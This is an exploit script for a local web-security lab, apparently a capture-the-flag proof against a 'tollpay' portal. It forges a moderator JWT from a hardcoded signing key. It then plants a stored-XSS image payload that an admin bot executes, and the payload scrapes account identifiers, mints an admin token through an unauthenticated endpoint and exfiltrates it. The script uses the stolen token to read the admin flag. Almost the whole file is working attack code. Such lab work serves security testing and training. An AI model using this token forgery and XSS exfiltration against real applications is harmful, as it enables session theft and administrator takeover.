// Real browser proof: plant the stored-XSS task, let the puppeteer admin bot
// execute it, exfiltrate the admin token to the same-origin /collect sink, and
// read the flag. Only needs the tollpay lab running on port 4000.
const crypto = require('crypto');

const API = process.env.TARGET || 'http://localhost:4000'; // portal origin; API proxied under /api
const COLLECT_ID = 'e2e' + Date.now();
const SIGNING_KEY = 'tollpay-signing-key-2026';
const b64url = (b) => Buffer.from(b).toString('base64').replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
const sign = (c) => { const d = b64url(JSON.stringify({alg:'HS256',typ:'JWT'}))+'.'+b64url(JSON.stringify(c)); return d+'.'+b64url(crypto.createHmac('sha256',SIGNING_KEY).update(d).digest()); };
const jdec = (t) => JSON.parse(Buffer.from(t.split('.')[1],'base64').toString('utf8'));

// Inline stored-XSS payload: scrape admin identifiers same-origin, mint the
// admin token via the unauthenticated endpoint, exfil to the /collect sink.
const PAYLOAD = `<img src=x onerror="(async()=>{` +
  `var d=await (await fetch('/dashboard',{credentials:'include'})).text();` +
  `var o=new DOMParser().parseFromString(d,'text/html').getElementById('profile');` +
  `var a=o.getAttribute('data-account-id'),s=o.getAttribute('data-serial');` +
  `var m=await (await fetch('/api/v1/customers/'+a+'/setuponlineaccesstolltag?SerialNumber='+encodeURIComponent(s)+'&ActivitySource=external')).json();` +
  `new Image().src='/collect?id=${COLLECT_ID}&d='+encodeURIComponent(btoa(JSON.stringify({token:m.access_token,refresh:m.refresh_token})));` +
  `})()">`;

(async () => {
  const now = Math.floor(Date.now()/1e3);
  const mod = sign({ accountId:'3000053203', username:'mrodriguez', scope:'MODERATOR', type:'access_token', iat:now, exp:now+600 });
  const r = await fetch(`${API}/api/v1/tasks`, { method:'POST', headers:{'Content-Type':'application/json',Authorization:'Bearer '+mod},
    body: JSON.stringify({ title:'e2e dispute', body: PAYLOAD }) });
  console.log('planted task:', r.status);
  console.log('waiting for admin bot to execute (up to 60s)...');
  let got = null;
  for (let i=0;i<60 && !got;i++) {
    await new Promise(r=>setTimeout(r,1000));
    const c = await (await fetch(`${API}/collect?id=${COLLECT_ID}`)).json();
    if (c.entries && c.entries.length) got = decodeURIComponent(c.entries[0]);
  }
  if (!got) { console.error('FAIL: no exfil received'); process.exit(1); }
  const data = JSON.parse(Buffer.from(got,'base64').toString('utf8'));
  const claims = jdec(data.token);
  console.log('exfil received. token scope =', claims.scope, 'accountId =', claims.accountId);
  if (claims.scope !== 'ADMIN') { console.error('FAIL: not an admin token'); process.exit(1); }
  const rep = await (await fetch(`${API}/api/v1/admin/report`, { headers:{Authorization:'Bearer '+data.token} })).json();
  console.log('admin report flag =', rep.settlementKey);
  const ok = rep.settlementKey === crypto.createHash('md5').update('iloveyou').digest('hex');
  console.log(ok ? '\nPASS: stored XSS -> admin takeover -> flag, end to end in a real browser.' : '\nFAIL: flag mismatch');
  process.exit(ok?0:1);
})().catch(e => { console.error('FAIL:', e.message); process.exit(1); });
